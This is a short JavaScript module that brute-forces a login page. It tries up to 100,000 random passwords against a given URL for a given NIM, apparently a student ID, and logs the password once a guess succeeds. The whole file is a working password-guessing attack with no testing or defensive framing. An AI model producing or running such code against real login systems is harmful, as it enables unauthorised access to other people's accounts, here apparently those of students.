const { generateRandomString } = require('../utils/random');
const tryLogin = require('./apiService');
const config = require('../config/config'); 

async function bruteForceLoginToURL(nim, url, maxAttempts = 100000) {
    const tried = new Set();
    let attempts = 0;

    while (attempts < maxAttempts) {
        const guess = generateRandomString(config.passwordLength); 
        if (tried.has(guess)) continue;
        tried.add(guess);
        attempts++;

        const success = await tryLogin(url, nim, guess);
        if (success) {
            console.log(`✅ Login sukses!`);
            console.log(`👤 NIM: ${nim}`);
            console.log(`🔐 Password: ${guess}`);
            console.log(`📊 Percobaan: ${attempts}`);
            return;
        } else {
            console.log(`❌ [${attempts}] Coba password: ${guess}`);
        }
    }

    console.log('❌ Gagal menemukan password setelah banyak percobaan.');
}

module.exports = bruteForceLoginToURL;
